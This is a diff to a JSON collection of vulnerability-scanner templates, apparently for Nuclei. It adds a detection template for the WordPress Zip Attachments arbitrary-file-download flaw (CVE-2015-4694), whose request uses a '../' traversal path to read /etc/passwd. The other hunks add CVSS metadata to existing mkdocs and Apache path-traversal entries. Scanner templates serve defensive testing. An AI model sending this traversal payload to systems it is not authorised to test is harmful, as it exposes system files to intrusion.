@@ -8602,6 +8602,46 @@
       ]
     },
     {
+      "id": "CVE-2015-4694",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2015-4694",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+          "cvss-score": 8.6,
+          "cwe-id": "CWE-22"
+        },
+        "description": "The zip-attachments plugin allows arbitrary file downloads because it does not check the download path of the requested file.",
+        "name": "Zip Attachments <= 1.1.4 - Arbitrary File Download",
+        "reference": "https://wpscan.com/vulnerability/8047",
+        "severity": "high",
+        "tags": "lfi,wordpress,cve,cve2015,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../etc/passwd&za_filename=passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5461",
       "info": {
         "author": "0x_Akoko",
@@ -36225,6 +36265,12 @@
       "id": "CVE-2021-40978",
       "info": {
         "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-40978",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
         "description": "** DISPUTED ** The mkdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain :sensitive information. NOTE: the vendor has disputed this as described in https://github.com/mkdocs/mkdocs/issues/2601.] and https://github.com/nisdn/CVE-2021-40978/issues/1.",
         "name": "mkdocs 1.2.2 built-in dev-server allows directory traversal",
         "reference": [
@@ -36682,6 +36728,12 @@
       "id": "CVE-2021-42013",
       "info": {
         "author": "nvn1729,0xd0ff9",
+        "classification": {
+          "cve-id": "CVE-2021-42013",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-22"
+        },
         "description": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.",
         "name": "Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution",
         "reference": [
